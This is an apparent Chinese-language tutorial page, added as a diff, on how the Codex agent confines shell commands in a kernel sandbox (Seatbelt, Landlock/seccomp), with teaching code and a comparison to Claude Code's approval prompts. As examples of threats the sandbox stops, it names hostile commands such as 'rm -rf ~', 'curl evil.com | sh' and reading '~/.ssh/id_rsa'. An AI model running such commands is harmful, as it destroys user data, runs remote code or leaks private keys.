@@ -1,0 +1,116 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>s05: Sandbox — 把每条命令关进内核沙箱</title>
+<link rel="stylesheet" href="../assets/codex.css">
+</head>
+<body>
+<div class="topbar"><a href="../index.html">📘 learn-codex</a></div>
+<main class="md">
+<h1 id="s05-sandbox-把每条命令关进内核沙箱">s05: Sandbox — 把每条命令关进内核沙箱</h1>
+<blockquote><em>&quot;Claude Code 在应用层挡，Codex 在内核层关。&quot;</em></blockquote>
+<p><a href="../index.html">learn-codex 总览</a> · 上一章：<a href="../s04_approval/index.html">s04 approval</a> → <strong>s05</strong> → 下一章：<a href="../s06_agents_md/index.html">s06 AGENTS.md</a></p>
+<hr>
+<h2 id="先把思想说透为什么真正的安全是内核来关而不是应用来挡">先把思想说透：为什么真正的安全是&quot;内核来关&quot;，而不是&quot;应用来挡&quot;</h2>
+<p>这一章是整门课的脊梁。如果你只想记住一句话，就记这句：<strong>Claude Code 在应用层&quot;挡&quot;，Codex 在内核层&quot;关&quot;。</strong> 但光记这句没用，得想通它为什么成立。下面三个道理层层递进，想明白了，你就懂了为什么 Codex 敢在没人盯着的机器上跑。</p>
+<p><strong>道理一：在&quot;门里&quot;自己看门，永远看不住。</strong> 上一章（<a href="../s04_approval/index.html">s04</a>）我们用审批拦危险命令。但审批靠的是程序自己读一眼命令、判断&quot;这条危不危险&quot;——这相当于让<strong>程序自己当门卫</strong>。问题在于，命令的写法千变万化，而真正动手删文件的，根本不是那串命令文本，而是它启动的进程。模型完全可以写一句看着人畜无害的 <code>python build.py</code>，而 <code>build.py</code> 里偷偷 <code>os.remove</code> 了你的密钥。门卫检查的是&quot;门口递进来的纸条&quot;，可坏事是进门之后才干的——<strong>只要执法点在程序内部，被它启动的子进程就有办法绕过它</strong>。这就是&quot;挡&quot;的天花板：它拦的是文本，拦不住行为。</p>
+<p><strong>道理二：把执法点搬到进程&quot;够不着&quot;的地方——操作系统内核。</strong> 那把关卡设在哪才绕不过去？设在<strong>比任何程序都低一层、由硬件和内核强制的地方</strong>。你的进程想写文件、想联网，最终都得向操作系统<strong>请求</strong>；操作系统完全可以直接回一句&quot;不行&quot;。这就是沙箱：在启动命令<strong>之前</strong>，先告诉内核&quot;接下来这个进程，只准写这一个文件夹，别的一律拒&quot;。之后无论这个进程怎么折腾、怎么 fork 子进程、用什么语言写脚本，<strong>每一次写越界的文件,都是内核当场驳回</strong>——不是程序&quot;决定不让&quot;，是它<strong>根本碰不到</strong>。 打个比方：审批是大楼前台让访客签到（前台可能被花言巧语骗过、可能漏看），沙箱是直接给这间办公室换一把<strong>物理门锁</strong>——你没有那把钥匙，再能说会道也开不了门。门卫会犯错，锁不会。</p>
+<p><strong>道理三：默认全关，再一条条放开——而不是默认全开，再一条条堵。</strong> 最后一个巧思在&quot;基线&quot;的选法。黑名单的思路是&quot;默认允许，遇到坏的才堵&quot;（堵不完）。沙箱反过来：<strong><code>(deny default)</code>——默认什么都不许，然后只把这次任务</strong>真正需要<strong>的最小权限显式放开</strong>（读可以到处读，但写只准落在工作区里）。这一反转的威力在于：你<strong>忘了堵某个危险操作</strong>会出事，但你<strong>忘了放开某个权限</strong>最多是命令报个错——失败的方向是安全的。安全系统就该这样：默认拒绝，让&quot;漏&quot;变成&quot;卡一下&quot;，而不是&quot;出事&quot;。</p>
+<p>把三点连起来：应用层的门卫拦得了文本、拦不住行为（道理一），所以要把执法点下沉到进程绕不过的内核（道理二），并且从&quot;默认全拒&quot;起步、只放开最小必要（道理三）。正因为这道关<strong>独立于人、也独立于模型有没有犯傻</strong>，Codex 才敢在 <code>codex exec</code> 无头模式、云端 agent 这些<strong>没人审批</strong>的场景里放手让它跑。</p>
+<h2 id="问题">问题</h2>
+<p>agent 会跑任意命令。模型一旦失误（或被注入的恶意指令诱导），一句 <code>rm -rf ~</code> 或 <code>curl evil | sh</code> 就能酿成灾难。</p>
+<p>应用层黑名单挡得住吗？挡不住。命令的变体是无穷的：<code>rm -rf ~</code>、<code>rm -fr $HOME</code>、<code>find ~ -delete</code>、一个删文件的 Python 脚本……你永远列不全。</p>
+<p>Codex 的答案：<strong>不要试图枚举坏命令，而是从源头限制命令&quot;能碰到什么&quot;——用操作系统内核强制隔离。</strong></p>
+<h2 id="解决方案">解决方案</h2>
+<p>在 macOS 上用 <strong>Seatbelt</strong>（<code>/usr/bin/sandbox-exec</code>）。策略从 <code>(deny default)</code>（默认全部拒绝）起步，再逐条放开最小必要权限：读可以到处读，<strong>写只允许落在&quot;可写根&quot;里</strong>。</p>
+<pre><code>sandbox-exec  -p &#x27;(version 1)
+                  (deny default)            ← 关键：默认全拒
+                  (allow process-exec)
+                  (allow file-read*)        ← 读放开
+                  (allow file-write* (subpath (param &quot;WRITABLE_ROOT_0&quot;)))&#x27;
+              -D WRITABLE_ROOT_0=/path/to/workspace   ← 可写根用参数注入
+              -- /bin/sh -c &quot;&lt;命令&gt;&quot;</code></pre>
+<p>这忠实对应真源码：可执行路径 <code>MACOS_PATH_TO_SEATBELT_EXECUTABLE = &quot;/usr/bin/sandbox-exec&quot;</code>、<code>(deny default)</code> 基线（<a href="../../codex/codex-rs/sandboxing/src/seatbelt_base_policy.sbpl">seatbelt_base_policy.sbpl</a>）、可写根用 <code>-D</code> 注入 <code>(param ...)</code>（<code>seatbelt.rs:602 create_seatbelt_command_args</code>）。</p>
+<p>Linux 上 Codex 换用 <strong>Landlock + seccomp</strong>（或 bubblewrap），见 <code>codex-rs/linux-sandbox</code>。本章 demo 在非 macOS 上会退回无沙箱执行并提示。</p>
+<h2 id="工作原理">工作原理</h2>
+<p>看 <a href="code.py">code.py</a>：</p>
+<pre><code class="language-python">def build_seatbelt_policy(n_writable_roots):
+    lines = [&quot;(version 1)&quot;, &quot;(deny default)&quot;, &quot;(allow process-exec)&quot;,
+             &quot;(allow file-read*)&quot;, ...]
+    for i in range(n_writable_roots):
+        lines.append(f&#x27;(allow file-write* (subpath (param &quot;WRITABLE_ROOT_{i}&quot;)))&#x27;)
+    return &quot;\n&quot;.join(lines)
+
+def run_sandboxed(command, writable_roots):
+    args = [&quot;/usr/bin/sandbox-exec&quot;, &quot;-p&quot;, policy]
+    for i, root in enumerate(roots):
+        args += [&quot;-D&quot;, f&quot;WRITABLE_ROOT_{i}={root}&quot;]
+    args += [&quot;--&quot;, &quot;/bin/sh&quot;, &quot;-c&quot;, command]
+    return subprocess.run(args, ...)</code></pre>
+<p>然后 s01 的 <code>run_shell</code> 改成调用 <code>run_sandboxed(command, writable_roots=[WORKDIR])</code>——agent 跑的每条命令都被关进工作区。</p>
+<p><strong>走一遍</strong> — 拿一条想&quot;越狱&quot;的命令，看内核怎么当场驳回它。工作区设为 <code>.../sandbox_demo</code>，现在让 agent 跑一句想往 home 目录写文件的命令：</p>
+<pre><code class="language-bash">touch /Users/ze/codex_escape_test.txt</code></pre>
+<p>第一步，<code>build_seatbelt_policy(1)</code> 拼出一份策略文本——注意它从 <code>(deny default)</code> 起步，只显式放开读和&quot;写进工作区&quot;：</p>
+<pre><code class="language-text">(version 1)
+(deny default)                ← 默认全拒
+(allow process-exec)
+(allow file-read*)            ← 读放开
+(allow file-write* (subpath (param &quot;WRITABLE_ROOT_0&quot;)))   ← 写只准落在工作区</code></pre>
+<p>第二步，<code>run_sandboxed</code> 把这份策略、用 <code>-D</code> 注入的可写根、以及命令本身拼成一条真正交给内核的 <code>sandbox-exec</code> 调用：</p>
+<pre><code class="language-text">/usr/bin/sandbox-exec -p &#x27;&lt;上面那份策略&gt;&#x27; \
+  -D WRITABLE_ROOT_0=/Users/.../sandbox_demo \
+  -- /bin/sh -c &quot;touch /Users/ze/codex_escape_test.txt&quot;</code></pre>
+<p>第三步，命令真的跑起来了，<code>touch</code> 进程也真的尝试写那个 home 路径——但目标在工作区之外，不匹配任何 <code>file-write*</code> 规则，于是落进 <code>(deny default)</code>，<strong>内核当场把这次写系统调用驳回</strong>：</p>
+<pre><code class="language-text">[exit 1] touch: /Users/ze/codex_escape_test.txt: Operation not permitted
+实际检查：/Users/ze/codex_escape_test.txt 存在吗？ -&gt; False</code></pre>
+<p>这就是&quot;关&quot;与&quot;挡&quot;的区别落到实处：不是我们的 Python 代码读了命令、判断&quot;这条想越界、我不让它跑&quot;——命令<strong>照跑不误</strong>，是它发出的写操作被<strong>内核</strong>拒绝了，文件<strong>根本没被创建</strong>。换一句更刁钻的写法（比如塞进一个 Python 脚本里去 <code>os.remove</code>）也一样：只要那个进程没有写工作区外的权限，它就是碰不到。</p>
+<p><code>--demo</code> 直接演示：写工作区内成功，写 home 目录被内核拒绝（<code>Operation not permitted</code>），且那个文件<strong>确实没被创建</strong>。</p>
+<h2 id="生产级一道真沙箱严在四个默认上">生产级：一道真沙箱，严在四个&quot;默认&quot;上</h2>
+<p>教学版的 8 行策略够你看懂&quot;关&quot;的形状；但一道<strong>能上生产</strong>的沙箱，狠在它的几个默认值都朝&quot;安全&quot;那边倒——正是这几点让 Codex 敢在无人值守时放手跑。（行号级细节在下面「深入」逐条展开，这里先把原则立住。）</p>
+<ul><li><strong>默认全拒（deny default），失败朝安全的方向倒。</strong> 策略起手就是 <code>(deny default)</code>，之后<strong>只</strong>逐条放行必需的。妙在<strong>失败方向</strong>：你忘了放行某权限，顶多命令报错（烦，但安全）；黑名单式的&quot;默认放行、列举坏的&quot;一旦漏列一条，就是一次真实越界。<code>--demo</code> 现在会把生成的策略打印出来，你能<strong>数清</strong>到底放行了哪几条。</li><li><strong>默认禁网。</strong> 通篇策略没有一条 <code>network-*</code> 允许 → 出网被内核挡死。这拦的不是&quot;写越界&quot;，而是<strong>外传</strong>：哪怕模型 <code>curl evil.com | sh</code> 或想把密钥 POST 出去，连接根本建不起来。要联网得走<strong>显式代理 + unix-socket 白名单</strong>（真源码 <code>seatbelt_network_policy.sbpl</code> + <code>NetworkProxy</code>），而不是开个口子。</li><li><strong>读 ≠ 写，且读也不全开。</strong> 教学版图省事 <code>(allow file-read*)</code>；真 Codex 还有 <code>unreadable_roots</code> / <code>restricted_read_only_platform_defaults.sbpl</code>，把密钥这类敏感路径连<strong>读</strong>都挡掉——别让 agent 随手 <code>cat</code> 走你的 <code>~/.ssh</code>。</li><li><strong>逐条决定关不关、关哪种，而非一刀切。</strong> 真 Codex 按&quot;这条命令 + 审批结论 + 平台&quot;逐条挑：macOS 用 Seatbelt、Linux 用 Landlock+seccomp（退而 <code>bwrap</code>）、Windows 用受限令牌（<code>SandboxType</code> 四变体）；被 execpolicy 显式 allow 的命令还能 <code>bypass_sandbox</code> 直接跑（审批与沙箱正交，<a href="../s04_approval/index.html">s04</a>）。</li></ul>
+<blockquote>一句话：<strong>把&quot;安全&quot;做成默认值、把&quot;放行&quot;做成例外，并让每一个默认都朝&quot;出错也不闯祸&quot;的方向倒。</strong> 下面「深入」把这四点对到真源码的行号上。</blockquote>
+<h2 id="-与-claude-code-的不同">🆚 与 Claude Code 的不同</h2>
+<table><thead><tr><th></th><th>Claude Code</th><th>Codex</th></tr></thead><tbody><tr><td>主要防线</td><td>审批弹窗 + 工作区路径校验（<strong>应用层</strong>）</td><td>内核强制沙箱（Seatbelt / Landlock，<strong>内核层</strong>）</td></tr><tr><td>信任模型</td><td>信任模型 + 让用户把关</td><td>默认不信任，纵深防御</td></tr><tr><td>越界写 home</td><td>靠工具代码里的路径检查拦</td><td>内核直接拒绝，连 <code>sandbox-exec</code> 外的子进程都跑不掉</td></tr><tr><td>适配场景</td><td>偏交互式、审批 UX 为中心</td><td>也适合低/无人工审批的 headless / CI / 云端</td></tr></tbody></table>
+<p><strong>为什么不同？</strong> 根子在自主度与运行场景的设想：</p>
+<ul><li>Codex 想在<strong>几乎没有人盯着</strong>的情况下也安全运行（<code>codex exec</code> 无头模式、云端 agent）。没人审批时，唯一可靠的防线就是把安全<strong>下沉到内核</strong>——哪怕模型完全失控，内核也不放它越界。</li><li>Claude Code 更以<strong>交互式审批</strong>为中心：危险操作弹窗问你，由人把最后一道关。</li></ul>
+<p>注意：两者<strong>都有</strong>审批机制（Codex 的审批策略是 <a href="../s04_approval/index.html">s04</a>，与沙箱正交）。差别在&quot;第一道、且独立于人的防线&quot;放在哪里——Codex 放在内核，这是它最鲜明的工程取向。</p>
+<h2 id="深入教学版-vs-真-codex-源码">深入：教学版 vs 真 Codex 源码</h2>
+<p>教学版的 SBPL 策略就 8 行。真 Codex 的沙箱在 <a href="../../codex/codex-rs/sandboxing/index.html"><code>sandboxing/</code></a> + <a href="../../codex/codex-rs/linux-sandbox/index.html"><code>linux-sandbox/</code></a>，复杂得多。</p>
+<details>
+<summary>一、真实 Seatbelt 策略有多大</summary>
+<p><code>seatbelt_base_policy.sbpl</code> 基线就 <strong>123 行</strong>，之上还叠加网络策略（<code>seatbelt_network_policy.sbpl</code>）、unix socket 规则、可写根里的只读子路径排除、对 <code>.git</code> 等元数据的保护。<code>create_seatbelt_command_args</code>（<code>seatbelt.rs:602</code>）在运行时动态拼装这一切。</p>
+</details>
+<details>
+<summary>二、连"读"都不是全放开</summary>
+<p>教学版图省事 <code>(allow file-read*)</code> 全放开读。真 Codex 支持 <code>unreadable_roots</code>、<code>restricted_read_only_platform_defaults.sbpl</code>，对敏感路径限制读取——别让 agent 随手 <code>cat</code> 走你的密钥。</p>
+</details>
+<details>
+<summary>三、Linux 走完全不同的一套</summary>
+<p>macOS 是 Seatbelt；<strong>Linux 用 Landlock（LSM）+ seccomp</strong> 过滤系统调用，或退回 bubblewrap(<code>bwrap</code>)。见 <code>linux-sandbox/</code> 与 <code>sandboxing/src/landlock.rs</code>、<code>bwrap.rs</code>。<code>SandboxType</code> 枚举：<code>None / MacosSeatbelt / LinuxSeccomp / WindowsRestrictedToken</code>——同一套审批策略，四种内核实现。</p>
+</details>
+<details>
+<summary>四、网络也被关在门外</summary>
+<p>教学版只管文件写。真 Codex 的网络沙箱<strong>默认禁止出网</strong>，可按 host 精确放开，还有 MITM 代理可读根等机制。这样即便模型想 <code>curl evil.com | sh</code>，连接本身就建立不起来。</p>
+</details>
+<details>
+<summary>五、沙箱与审批怎么衔接：bypass_sandbox 与"逐条选沙箱"</summary>
+<p>教学版里&quot;沙箱&quot;是固定的一层——每条命令都用同一份策略 <code>run_sandboxed</code>。真 Codex 把&quot;这条命令到底进不进沙箱、进哪种沙箱&quot;做成了<strong>逐条决策</strong>，而且和上一章（<a href="../s04_approval/index.html">s04</a>）的审批结论是<strong>联动</strong>的：</p>
+<ul><li>审批裁决会包成 <code>ExecApprovalRequirement</code>（<code>core/src/tools/sandboxing.rs</code>）。其中 <code>Skip { bypass_sandbox, .. }</code> 这个分支里的 <code>bypass_sandbox</code> 字段，决定了一条被 execpolicy <strong>显式 allow</strong> 的命令可以<strong>完全跳过沙箱</strong>直接跑——这正是&quot;审批与沙箱正交&quot;在类型层面的落点：批准只是放它进门，是否还套一层内核约束是另一个独立开关。</li><li>具体套哪种内核实现由 <code>SandboxType</code> 决定（<code>None / MacosSeatbelt / LinuxSeccomp / WindowsRestrictedToken</code>），运行时按平台选；可写根、网络放行、只读排除等都在这一步动态拼进策略。</li><li>还有一条&quot;全都不要&quot;的逃生口：<code>--dangerously-bypass-approvals-and-sandbox</code>（俗称 YOLO 模式）会<strong>同时</strong>关掉审批和沙箱。它存在是为了某些可信的自动化场景，但等于把这一章和上一章的两道防线一起拆了——只应在你完全清楚后果时使用。</li></ul>
+<p>一句话：教学版是&quot;一刀切地都进同一个沙箱&quot;，真 Codex 是&quot;<strong>按命令、按审批结论、按平台</strong>，逐条决定关不关、关哪种&quot;。</p>
+</details>
+<h2 id="运行">运行</h2>
+<pre><code class="language-bash">python s05_sandbox/code.py --demo   # 不需要模型：打印生成的策略 + 演示「区内放行 / 区外拦截」
+python s05_sandbox/code.py          # 交互模式：shell 命令都被沙箱关在工作区</code></pre>
+<blockquote>macOS 会打印 <code>sandbox-exec: ... is deprecated</code> 的告警——这是系统提示，功能仍然有效，真 Codex 也照用不误。demo 跑完会<strong>自动清理</strong> <code>sandbox_demo/</code> 工作区（和其余各章一致）。</blockquote>
+<h2 id="小结">小结</h2>
+<ul><li><strong>关 vs 挡</strong>：应用层只能读命令文本来&quot;挡&quot;，拦得了文本拦不住行为（一句 <code>python x.py</code> 就能绕过）；内核层在进程绕不过的地方&quot;关&quot;，命令照跑、越界操作被内核当场驳回。</li><li>所以执法点要<strong>下沉到内核</strong>：不枚举坏命令，而是从源头限制命令&quot;能碰到什么&quot;。</li><li>基线选 <code>(deny default)</code>——默认全拒、只放开最小必要（读放开，写仅限可写根）。妙在<strong>失败的方向是安全的</strong>：忘了放开权限顶多命令报错，忘了堵危险操作才会出事。</li><li>这道关<strong>独立于人、也独立于模型有没有犯傻</strong>，所以 Codex 才敢在无人审批的 headless / CI / 云端放手跑——这是它与 Claude Code 最鲜明的分野。</li><li>生产级看四个&quot;默认&quot;：默认全拒（fail-closed）、默认禁网、读≠写且读也设限、逐条选沙箱——<strong>安全是默认值、放行是例外</strong>（见「生产级」一节）。</li><li>下一站 <a href="../s06_agents_md/index.html">s06</a>：让项目把自己的规矩写进文件，agent 沿目录树分层读进来。</li><li>回到 <a href="../index.html">总览</a> 看完整 17 章路线图。</li></ul>
+<h2 id="思考">思考</h2>
+<div class="think">
+<ol><li>沙箱挡住了&quot;写越界&quot;，但模型若 <code>cat ~/.ssh/id_rsa</code> 把密钥打印到输出里，再设法外传呢？只靠文件沙箱够吗？还需要哪几层？</li><li><code>(deny default)</code> 起步意味着每放开一项都得显式写规则——安全但很累。若某个正经命令因缺一条规则跑不起来，你会&quot;再放开一点&quot;还是&quot;保持收紧&quot;？依据是什么？</li><li>Claude Code 靠人审批、Codex 靠内核关。当 agent 要在<strong>无人值守</strong>的 CI 里跑时，这两条路谁更可信？为什么？</li><li>沙箱（内核强制）和审批（人点头）是正交的两层。能不能只要其一？什么场景下你会同时关掉两者（<code>--dangerously-bypass</code>），又为什么这很危险？</li></ol>
+</div>
+</main>
+<footer>本页由 <code>build_html.py</code> 从 Markdown 渲染生成。</footer>
+</body>
+</html>
